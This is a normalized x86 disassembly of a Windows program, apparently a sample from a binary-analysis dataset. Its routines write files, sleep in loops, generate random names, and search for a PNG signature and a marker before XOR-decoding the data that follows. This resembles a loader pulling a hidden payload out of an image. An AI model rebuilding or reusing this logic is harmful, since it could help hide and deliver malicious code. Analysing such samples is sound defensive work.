mov [ eax + 0xc ] dl
mov ecx [ r--data ]
mov eax [ esi + 0x10 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
movzx edx [ r--data ]
mov [ eax + 0xc ] dl
jmp r-xdata
mov ecx esi
call sub_4014f0
test al al
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x5
jae r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esi + 0x10 ]
mov edx [ edx + 0x24 ]
push eax
call edx
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ esi + 0xc ]
mov eax [ eax + 0x20 ]
push edx
call eax
mov ecx [ esi + 0x4 ]
push r--data
call sub_4029f0
mov ecx [ esi + 0x10 ]
push ecx
push r--data
call printf
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x5c ]
add esp 0x8
push eax
call [ Sleep@IAT ]
jmp r-xdata
push ebx
push r--data
call printf
mov ecx [ esi + 0x4 ]
add esp 0x8
push r--data
call sub_4029f0
mov ecx [ esi + 0x4 ]
push ebx
call sub_4029f0
mov ecx [ esi + 0x4 ]
push r--data
call sub_4029f0
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x56 ] 0x0
je r-xdata
push r--data
call printf
mov ecx [ esi + 0x4 ]
add esp 0x4
push r--data
call sub_4029f0
mov eax [ esi + 0xc ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov ecx [ r--data ]
mov [ eax + 0x10 ] ecx
mov eax [ esi + 0x10 ]
mov edx [ r--data ]
mov [ eax ] edx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov edx [ r--data ]
mov [ eax + 0x8 ] edx
mov ecx [ r--data ]
mov [ eax + 0xc ] ecx
mov edx [ r--data ]
mov [ eax + 0x10 ] edx
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ esi + 0x10 ]
mov eax [ eax + 0x24 ]
push edx
call eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov edi ebx
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov dx [ r--data ]
push 0x19000
mov [ edi ] dx
mov eax [ esi + 0xc ]
push 0x0
push eax
call memset
mov ecx [ esi + 0x10 ]
push 0x400
push 0x0
push ecx
call memset
push r--data
push ebx
call strstr
add esp 0x20
test eax eax
je r-xdata
lea ebx [ ebx ]
push r--data
push ebx
call strstr
mov ebp eax
mov edi ebp
sub edi ebx
push edi
push ebx
mov ebx [ esp + 0x20 ]
push ebx
call memcpy
add esp 0x14
push ebx
mov ecx esi
mov [ edi + ebx ] 0x0
call sub_401920
lea ebx [ ebp + 0x1 ]
push r--data
push ebx
call strstr
add esp 0x8
test eax eax
jne r-xdata
sub_402440
push ebx
push ebp
push esi
xor ebp ebp
push edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x14 ] ebp
xor bl bl
add ecx ecx
sub edx 0x1
jne r-xdata
not esi
test eax ecx
je r-xdata
add edi edi
test edi 0x8000
je r-xdata
test esi esi
je r-xdata
or bl 0x80
mov eax [ esp + 0x14 ]
inc eax
mov [ esp + 0x14 ] eax
cmp eax 0x8
jne r-xdata
or edi 0x1
shr bl 0x1
jmp r-xdata
mov eax [ esp + 0x18 ]
mov [ eax + ebp ] bl
cmp ebp [ esp + 0x1c ]
je r-xdata
mov eax edi
mov ecx 0x1
and eax 0x4001
xor esi esi
lea edx [ ecx + 0xe ]
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
inc ebp
xor bl bl
mov [ esp + 0x14 ] 0x0
sub_402500
push 0xffffffff
push sub_405868
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
mov al 0xa
push esi
mov esi [ esp + 0x34 ]
mov ebx ecx
mov cl 0x4e
mov [ esp + 0x1d ] al
mov [ esp + 0x1f ] al
lea eax [ esp + 0x18 ]
push edi
mov edx esi
mov edi eax
mov [ esp + 0x1e ] cl
mov [ esp + 0x16 ] cl
mov [ esp + 0x1c ] 0x89
mov [ esp + 0x1d ] 0x50
mov [ esp + 0x1f ] 0x47
mov [ esp + 0x20 ] 0xd
mov [ esp + 0x22 ] 0x1a
mov [ esp + 0x24 ] 0x0
mov [ esp + 0xc ] 0x7a
mov [ esp + 0xd ] 0x54
mov [ esp + 0xe ] 0x58
mov [ esp + 0xf ] 0x74
mov [ esp + 0x14 ] 0x49
mov [ esp + 0x15 ] 0x45
mov [ esp + 0x17 ] 0x44
mov ecx 0x8
sub edx edi
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x8
sub ecx 0x4
add eax 0x4
cmp ecx 0x4
jae r-xdata
mov edi [ edx + eax ]
cmp edi [ eax ]
jne r-xdata
mov edi [ esp + 0xc ]
push ebp
mov ebp [ esp + 0x18 ]
add esi 0x8
lea esi [ esi + eax + 0x8 ]
cmp [ esi + 0x4 ] 0x68686868
jne r-xdata
mov eax [ esi ]
push eax
mov ecx ebx
call sub_4024d0
add esi 0x4
mov [ esp + 0x10 ] eax
cmp [ esi ] edi
jne r-xdata
mov ecx [ esp + 0x2c ]
pop ebp
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x8
cmp [ esi ] ebp
jne r-xdata
lea edi [ eax - 0x8 ]
mov eax [ esp + 0x40 ]
push edi
push 0x0
push eax
call memset
push edi
call ??2@YAPAXI@Z
mov ebp [ esi + 0x8 ]
add esp 0x10
lea ecx [ esp + 0x3c ]
mov ebx eax
call sub_4024c0
push edi
mov ecx ebp
shl ecx 0x4
lea edx [ ecx + ebp + 0xd ]
push ebx
push edx
lea ecx [ esp + 0x48 ]
mov [ esp + 0x40 ] 0x0
call sub_402440
xor eax eax
test edi edi
jbe r-xdata
mov esi [ esp + 0x10 ]
lea ecx [ esp + 0x3c ]
add esi 0xfffffff8
mov [ esp + 0x34 ] 0xffffffff
call sub_4014a0
pop ebp
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x8
mov ecx [ esp + 0x40 ]
mov ebp ebx
sub ebp ecx
nop
mov dl [ esi + eax + 0xc ]
xor dl [ ecx + ebp ]
inc eax
mov [ ecx ] dl
inc ecx
cmp eax edi
jb r-xdata
sub_4026a0
xor eax eax
push esi
mov esi ecx
push 0x400
mov [ esi ] r--data
mov [ esi + 0x410 ] eax
mov [ esi + 0x414 ] eax
mov [ esi + 0x418 ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0x41c ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0x420 ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0x424 ] eax
call ??2@YAPAXI@Z
mov [ esi + 0x428 ] eax
add esp 0x10
mov eax esi
pop esi
retn
sub_402710
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4014a0
mov ecx esi
call sub_4014a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_402740
sub esp 0x8
push ebp
push esi
mov ebp ecx
mov eax [ ebp + 0xc4 ]
push 0x500000
push 0x0
push eax
call memset
mov eax [ esp + 0x20 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
xor esi esi
mov [ esp + 0xc ] eax
mov [ esp + 0x8 ] esi
test eax eax
jle r-xdata
mov eax [ ebp + 0xc4 ]
pop esi
pop ebp
add esp 0x8
retn 0x4
push ebx
push edi
mov edx [ ebp + 0xc4 ]
add edx esi
push r--data
push edx
call sprintf
mov edx [ ebp + 0xc4 ]
movzx eax bl
shr eax 0x4
movsx ecx [ eax + r--data ]
push ecx
inc esi
add edx esi
push r--data
push edx
call sprintf
mov ecx [ ebp + 0xc4 ]
and edi 0xf
movsx eax [ edi + r--data ]
push eax
inc esi
add ecx esi
push r--data
push ecx
call sprintf
add esp 0x20
mov al bl
sub al 0x21
cmp al 0x59
ja r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x1c ]
mov bl [ ecx + edx ]
movsx edi bl
push edi
push r--data
call _mbschr
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop ebx
mov ecx [ ebp + 0xc4 ]
mov [ esi + ecx ] bl
jmp r-xdata
mov eax [ esp + 0x10 ]
inc eax
inc esi
cmp eax [ esp + 0x14 ]
mov [ esp + 0x10 ] eax
jl r-xdata
sub_402830
push esi
mov esi ecx
push 0x100000
mov [ esi ] r--data
mov [ esi + 0xb8 ] 0x400
call malloc
push 0x104
mov [ esi + 0xbc ] eax
call ??2@YAPAXI@Z
mov [ esi + 0xc8 ] eax
xor eax eax
mov [ esi + 0x42 ] eax
mov [ esi + 0x46 ] eax
mov [ esi + 0x4a ] eax
mov [ esi + 0x4e ] eax
mov [ esi + 0x52 ] eax
add esp 0x8
mov eax esi
pop esi
retn
sub_402890
mov eax [ esp + 0x4 ]
push ebx
push esi
push r--data
xor ebx ebx
push ebx
mov esi ecx
mov ecx [ esi + 0x80 ]
push ebx
push eax
call sub_4049e0
test al al
je r-xdata
push r--data
call printf
add esp 0x4
pop esi
or eax 0xffffffff
pop ebx
retn 0xc
push edi
xor edi edi
cmp [ esi + 0x7c ] ebx
jbe r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esi + 0x80 ]
mov eax [ ecx + 0x41c ]
push 0x0
push edx
mov edx [ esp + 0x1c ]
push edx
push 0x0
push eax
call sub_4037f0
test al al
je r-xdata
lea ecx [ ecx ]
push r--data
call printf
add esp 0x4
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn 0xc
mov eax [ esi + 0x8c ]
push 0x400
push 0x0
push eax
call memset
mov ecx [ esi + 0x8c ]
add esp 0xc
push 0x400
push ecx
mov ecx [ esi + 0x80 ]
call sub_404520
mov edx [ esi + 0x90 ]
push 0x400
push 0x0
push edx
call memset
mov eax [ esi + 0x88 ]
push 0x19000
push 0x0
push eax
call memset
add esp 0x18
mov ecx [ esi + 0xb0 ]
mov edx [ ecx + edi * 4 ]
mov eax [ esi + 0xac ]
mov ecx [ eax + edi * 4 ]
push edx
push ecx
mov ecx [ esi + 0x80 ]
call sub_403ac0
inc edi
cmp edi [ esi + 0x7c ]
jb r-xdata
mov ecx [ esi + 0x90 ]
push 0x400
push ecx
mov ecx [ esi + 0x80 ]
call sub_404550
mov edx [ esi + 0x90 ]
mov edi eax
mov eax [ esi + 0x88 ]
push edi
push edx
add eax ebx
push eax
call memcpy
mov ecx [ esi + 0x90 ]
push 0x400
push 0x0
push ecx
add ebx edi
call memset
add esp 0x18
test edi edi
jne r-xdata
mov ecx [ esi + 0x80 ]
call sub_4037b0
pop edi
pop esi
mov eax ebx
pop ebx
retn 0xc
sub_4029f0
push ecx
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push esi
push edi
mov edi [ CreateFileA@IAT ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x2
push 0x40000000
push r--data
call edi
mov esi eax
test esi esi
je r-xdata
mov al 0x1
pop ecx
retn 0x4
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push r--data
call edi
mov esi eax
test esi esi
jne r-xdata
cmp esi 0xffffffff
jne r-xdata
push 0x2
push 0x0
push 0x0
push esi
call [ SetFilePointer@IAT ]
mov edx [ esp + 0x10 ]
mov eax edx
mov [ esp + 0x8 ] 0x0
lea edi [ eax + 0x1 ]
mov edi edi
pop edi
xor al al
pop esi
pop ecx
retn 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push 0x0
lea ecx [ esp + 0xc ]
push ecx
sub eax edi
push eax
push edx
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ecx
retn 0x4
sub_402ab0
sub esp 0x8
push ebx
push ebp
push esi
push edi
push 0x104
call ??2@YAPAXI@Z
push 0x104
mov edi eax
call ??2@YAPAXI@Z
add esp 0x8
push 0x104
push edi
push 0x0
mov esi eax
call [ GetModuleFileNameA@IAT ]
push 0x3
call ??2@YAPAXI@Z
push 0x104
mov ebx eax
call ??2@YAPAXI@Z
push 0x104
mov ebp eax
call ??2@YAPAXI@Z
push 0xa
mov [ esp + 0x20 ] eax
call ??2@YAPAXI@Z
push eax
mov eax [ esp + 0x24 ]
push eax
push ebp
push ebx
push edi
call _splitpath
mov edi [ esp + 0x40 ]
push r--data
push edi
call strstr
add esp 0x2c
test eax eax
je r-xdata
push edi
push ebp
push ebx
push r--data
push esi
call sprintf
add esp 0x14
mov edx esi
mov eax edi
sub edx edi
push r--data
push ebp
push ebx
push r--data
push esi
call sprintf
add esp 0x14
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push esi
call [ CreateFileA@IAT ]
mov edi eax
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push edx
push eax
push edi
mov [ esp + 0x28 ] 0x0
call [ WriteFile@IAT ]
push edi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x8
retn 0xc
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x8
retn 0xc
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push esi
call [ CreateFileA@IAT ]
mov edi eax
test edi edi
je r-xdata
sub_402bf0
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
push eax
call strstr
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
pop edi
xor al al
pop esi
retn 0x10
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x14 ]
sub eax edx
add esi eax
push ecx
push esi
call strstr
add esp 0x8
test eax eax
jne r-xdata
mov edi eax
sub edi esi
push edi
push esi
mov esi [ esp + 0x20 ]
push esi
call memcpy
add esp 0xc
mov [ edi + esi ] 0x0
pop edi
mov al 0x1
pop esi
retn 0x10
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add eax esi
sub_402c70
mov eax [ esp + 0x18 ]
push ebx
push esi
push eax
xor ebx ebx
push ebx
mov esi ecx
mov ecx [ esp + 0x14 ]
push ebx
push ecx
mov ecx [ esi + 0x80 ]
call sub_4049e0
test al al
je r-xdata
push r--data
call printf
add esp 0x4
pop esi
or eax 0xffffffff
pop ebx
retn 0x18
mov edx [ esp + 0x10 ]
mov eax edx
push edi
lea edi [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esi + 0x80 ]
sub eax edi
push eax
push edx
call sub_4049c0
xor edi edi
cmp [ esi + 0x7c ] ebx
jbe r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ esi + 0x80 ]
mov eax [ ecx + 0x41c ]
push 0x0
push edx
mov edx [ esp + 0x20 ]
push edx
push 0x3
push eax
call sub_4037f0
test al al
je r-xdata
lea ecx [ ecx ]
push r--data
call printf
add esp 0x4
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn 0x18
mov eax [ esi + 0x8c ]
push 0x400
push 0x0
push eax
call memset
mov ecx [ esi + 0x8c ]
add esp 0xc
push 0x400
push ecx
mov ecx [ esi + 0x80 ]
call sub_404520
mov edx [ esi + 0x90 ]
push 0x400
push 0x0
push edx
call memset
mov eax [ esi + 0x88 ]
push 0x19000
push 0x0
push eax
call memset
add esp 0x18
mov edx [ esi + 0xb0 ]
mov eax [ edx + edi * 4 ]
mov ecx [ esi + 0xac ]
mov edx [ ecx + edi * 4 ]
mov ecx [ esi + 0x80 ]
push eax
push edx
call sub_403ac0
inc edi
cmp edi [ esi + 0x7c ]
jb r-xdata
mov ecx [ esi + 0x90 ]
push 0x400
push ecx
mov ecx [ esi + 0x80 ]
call sub_404550
mov edx [ esi + 0x90 ]
mov edi eax
mov eax [ esi + 0x88 ]
push edi
push edx
add eax ebx
push eax
call memcpy
mov ecx [ esi + 0x90 ]
push 0x400
push 0x0
push ecx
add ebx edi
call memset
add esp 0x18
test edi edi
jne r-xdata
mov ecx [ esi + 0x80 ]
call sub_4037b0
pop edi
pop esi
mov eax ebx
pop ebx
retn 0x18
sub_402e30
push ecx
mov eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push ebp
push esi
push edi
sub eax edx
push 0x2
mov ebp eax
call ??2@YAPAXI@Z
mov edi eax
xor eax eax
add esp 0x4
xor esi esi
mov [ edi ] ax
test ebp ebp
jbe r-xdata
mov edx [ esp + 0x18 ]
push edi
mov [ edx + ebp ] 0x0
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebp
pop ecx
retn
mov ecx [ esp + 0x18 ]
lea edx [ ecx + ebp - 0x1 ]
mov [ esp + 0xc ] edx
push ebx
lea ebx [ ebx ]
mov edx [ esp + 0x18 ]
mov al [ esi + edx ]
mov ecx r--data
lea ebx [ ecx + 0x1 ]
mov eax [ esp + 0x18 ]
mov cl [ esi + eax ]
push edi
push r--data
mov [ edi ] cl
call strstr
add esp 0x8
test eax eax
je r-xdata
pop ebx
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx ebx
lea edx [ ecx + r--data ]
cmp eax edx
je r-xdata
mov al [ eax + 0x1 ]
jmp r-xdata
mov ecx [ esp + 0x10 ]
dec [ esp + 0x10 ]
inc esi
mov [ ecx ] al
cmp esi ebp
jb r-xdata
sub_402ee0
mov eax [ esp + 0x4 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push ebx
push esi
push edi
sub eax edx
push 0x2
mov ebx eax
call ??2@YAPAXI@Z
mov edi eax
xor eax eax
add esp 0x4
xor esi esi
mov [ edi ] ax
test ebx ebx
jbe r-xdata
mov edx [ esp + 0x14 ]
pop edi
pop esi
mov [ ebx + edx ] al
pop ebx
retn
mov ecx [ esp + 0x14 ]
push ebp
lea ebp [ ebx + ecx - 0x1 ]
mov edx [ esp + 0x14 ]
mov al [ esi + edx ]
mov [ ebp ] al
cmp eax r--data
je r-xdata
mov edx [ esp + 0x14 ]
mov al [ esi + edx ]
push edi
push r--data
mov [ edi ] al
call strstr
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
pop ebp
pop edi
pop esi
mov [ ebx + ecx ] 0x0
pop ebx
retn
mov cl [ eax - 0x1 ]
mov [ ebp ] cl
jmp r-xdata
inc esi
dec ebp
cmp esi ebx
jb r-xdata
sub_402f70
push 0xffffffff
push sub_40588b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
lea eax [ esp + 0xc ]
push edi
push eax
mov esi ecx
call _time64
push eax
call srand
push 0x434
call ??2@YAPAXI@Z
add esp 0xc
mov [ esp + 0xc ] eax
xor ebx ebx
mov [ esp + 0x20 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_4026a0
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov [ esi + 0x8 ] bl
mov [ esi + 0x7c ] ebx
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
jmp r-xdata
push 0x500000
mov [ esp + 0x24 ] 0xffffffff
mov [ esi + 0x80 ] eax
call ??2@YAPAXI@Z
push 0x500000
mov [ esi + 0xc0 ] eax
call ??2@YAPAXI@Z
push 0x200000
mov [ esi + 0xc4 ] eax
call ??2@YAPAXI@Z
push 0x200000
mov [ esi + 0x88 ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0xb4 ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0x8c ] eax
call ??2@YAPAXI@Z
push 0x19000
mov [ esi + 0x90 ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0xa4 ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0xa8 ] eax
call ??2@YAPAXI@Z
push 0x800
mov [ esi + 0x94 ] eax
call ??2@YAPAXI@Z
push 0x800
mov [ esi + 0x98 ] eax
call ??2@YAPAXI@Z
push 0x64
mov [ esi + 0x9c ] eax
call ??2@YAPAXI@Z
mov [ esi + 0xa0 ] eax
xor ecx ecx
mov eax 0x10
mov [ esi + 0x7c ] eax
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call ??2@YAPAXI@Z
mov [ esi + 0xac ] eax
mov eax [ esi + 0x7c ]
xor ecx ecx
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call ??2@YAPAXI@Z
push 0x104
mov [ esi + 0xb0 ] eax
call ??2@YAPAXI@Z
add esp 0x3c
xor edi edi
mov [ esi + 0x70 ] eax
cmp [ esi + 0x7c ] ebx
jbe r-xdata
push 0x104
call ??2@YAPAXI@Z
mov ecx [ esi + 0xac ]
push 0x400
mov [ ecx + edi * 4 ] eax
call ??2@YAPAXI@Z
mov edx [ esi + 0xb0 ]
mov [ edx + edi * 4 ] eax
inc edi
add esp 0x8
cmp edi [ esi + 0x7c ]
jb r-xdata
sub_403140
mov eax [ esp + 0x8 ]
push esi
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
lea esi [ ecx + 0x42 ]
sub esi eax
mov edi edi
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov [ ecx + 0x5c ] eax
mov al [ esp + 0x10 ]
mov [ ecx + 0x60 ] edx
mov [ ecx + 0x68 ] 0x0
mov [ ecx + 0x6c ] 0x0
mov [ ecx + 0x57 ] al
mov [ ecx + 0x58 ] 0x0
mov [ ecx + 0x56 ] 0x1
pop esi
retn 0x14
lea esi [ ecx + 0x10 ]
sub esi eax
mov dl [ eax ]
mov [ esi + eax ] dl
inc eax
test dl dl
jne r-xdata
mov dl [ eax ]
mov [ esi + eax ] dl
inc eax
test dl dl
jne r-xdata
sub_4031a0
sub esp 0x8
push ebx
push esi
push edi
push 0x0
call _time64
add esp 0x4
mov esi eax
mov [ esp + 0x10 ] edx
call [ GetTickCount@IAT ]
add eax esi
push eax
call srand
mov ebx [ esp + 0x1c ]
lea eax [ ebx + 0x1 ]
push eax
call ??2@YAPAXI@Z
add esp 0x8
xor esi esi
mov edi eax
test ebx ebx
jbe r-xdata
mov [ edi + ebx ] 0x0
pop edi
pop esi
pop ebx
add esp 0x8
retn 0x4
lea esp [ esp ]
call rand
cdq
mov ecx 0xa
idiv ecx
inc esi
add dl 0x30
mov [ esi + edi - 0x1 ] dl
cmp esi ebx
jb r-xdata
mov eax edi
sub_403210
push ebx
push esi
push edi
push 0x0
call _time64
push eax
call srand
mov ebx [ esp + 0x18 ]
lea eax [ ebx + 0x1 ]
push eax
call ??2@YAPAXI@Z
add esp 0xc
xor esi esi
mov edi eax
test ebx ebx
jbe r-xdata
mov [ edi + ebx ] 0x0
pop edi
pop esi
pop ebx
retn 0x4
call rand
cdq
mov ecx 0x1a
idiv ecx
inc esi
add dl 0x61
mov [ esi + edi - 0x1 ] dl
cmp esi ebx
jb r-xdata
mov eax edi
sub_4032a0
push 0xffffffff
push sub_4058a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov eax [ ebx + 0x98 ]
push 0x800
push 0x0
push eax
call memset
mov edi [ ebx + 0x98 ]
add esp 0xc
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx 0x3a
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ ebx + 0x98 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ ebx + 0x98 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov edx [ esp + 0x20 ]
mov ecx 0x29
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx [ ebx + 0x98 ]
push ecx
push 0x0
push edx
mov ecx ebx
call sub_402890
test eax eax
jg r-xdata
mov eax [ ebx + 0xa8 ]
push eax
push r--data
push r--data
mov ecx ebx
call sub_403280
test al al
je r-xdata
pop edi
pop esi
xor al al
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0xc
lea ecx [ esp + 0xf ]
call sub_4024c0
mov ecx [ ebx + 0xb4 ]
mov edx [ ebx + 0x88 ]
push ecx
push edx
lea ecx [ esp + 0x17 ]
mov [ esp + 0x20 ] 0x0
call sub_402500
test eax eax
jle r-xdata
mov eax [ ebx + 0xa8 ]
push r--data
push eax
call strstr
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0xf ]
mov [ esp + 0x18 ] 0xffffffff
call sub_4014a0
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov al 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0xc
mov edi [ esp + 0x24 ]
push ebp
push eax
mov eax [ ebx + 0xb4 ]
push eax
push edi
mov ecx ebx
call sub_402ab0
push 0x104
call ??2@YAPAXI@Z
push 0x104
mov esi eax
call ??2@YAPAXI@Z
add esp 0x8
push 0x104
push esi
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x3
call ??2@YAPAXI@Z
push 0x104
mov ebx eax
call ??2@YAPAXI@Z
push 0x104
mov ebp eax
call ??2@YAPAXI@Z
push 0xa
mov [ esp + 0x34 ] eax
call ??2@YAPAXI@Z
mov ecx [ esp + 0x34 ]
push eax
push ecx
push ebp
push ebx
push esi
call _splitpath
push r--data
push edi
call strstr
mov edx [ esp + 0x58 ]
add esp 0x2c
test eax eax
je r-xdata
push edi
push ebp
push ebx
push r--data
push edx
call sprintf
add esp 0x14
mov eax edi
sub edx edi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
jmp r-xdata
pop ebp
sub_403490
sub esp 0x18
push ebx
push ebp
push esi
push edi
push 0x80
call ??2@YAPAXI@Z
mov edi eax
push 0x40
mov [ esp + 0x24 ] edi
call ??2@YAPAXI@Z
mov ebx eax
push 0x80
mov [ esp + 0x2c ] ebx
call ??2@YAPAXI@Z
push 0x64
mov [ esp + 0x28 ] eax
call ??2@YAPAXI@Z
mov esi eax
mov eax [ esp + 0x3c ]
push esi
push edi
push ebx
push r--data
push eax
call sscanf
push 0x104
call ??2@YAPAXI@Z
push 0x104
mov edi eax
call ??2@YAPAXI@Z
add esp 0x2c
push 0x104
push edi
push 0x0
mov [ esp + 0x1c ] eax
call [ GetModuleFileNameA@IAT ]
push 0x3
call ??2@YAPAXI@Z
push 0x104
mov ebx eax
call ??2@YAPAXI@Z
push 0x104
mov ebp eax
call ??2@YAPAXI@Z
push 0xa
mov [ esp + 0x24 ] eax
call ??2@YAPAXI@Z
mov ecx [ esp + 0x24 ]
push eax
push ecx
push ebp
push ebx
push edi
call _splitpath
push r--data
push esi
call strstr
mov edx [ esp + 0x3c ]
add esp 0x2c
test eax eax
je r-xdata
push esi
push ebp
push ebx
push r--data
push edx
call sprintf
add esp 0x14
mov eax esi
sub edx esi
lea ebx [ ebx ]
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x18
retn
push 0x0
push esi
call [ GetFileSize@IAT ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
mov ebx eax
mov eax [ esp + 0x24 ]
push 0x40000000
push eax
call edi
mov [ esp + 0x10 ] eax
cmp eax 0xffffffff
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push ebx
call ??2@YAPAXI@Z
add esp 0x4
push 0x0
lea ecx [ esp + 0x28 ]
push ecx
push ebx
mov ebp eax
push ebp
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
lea eax [ ebx - 0x64 ]
xor edi edi
test eax eax
jbe r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push edi
mov edi [ CreateFileA@IAT ]
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
nop
inc edi
lea eax [ ebx - 0x64 ]
cmp edi eax
jb r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
mov eax 0x4
mov ecx r--data
lea esi [ edi + ebp ]
lea ecx [ ecx ]
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
test eax eax
je r-xdata
test edi edi
je r-xdata
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
push 0xc0
add edi ebp
push 0x0
push edi
call memset
mov esi [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
push esi
push ecx
call sub_402e30
mov eax esi
add esp 0x14
lea ecx [ eax + 0x1 ]
nop
cmp eax 0x1
jbe r-xdata
mov dl [ eax ]
inc eax
test dl dl
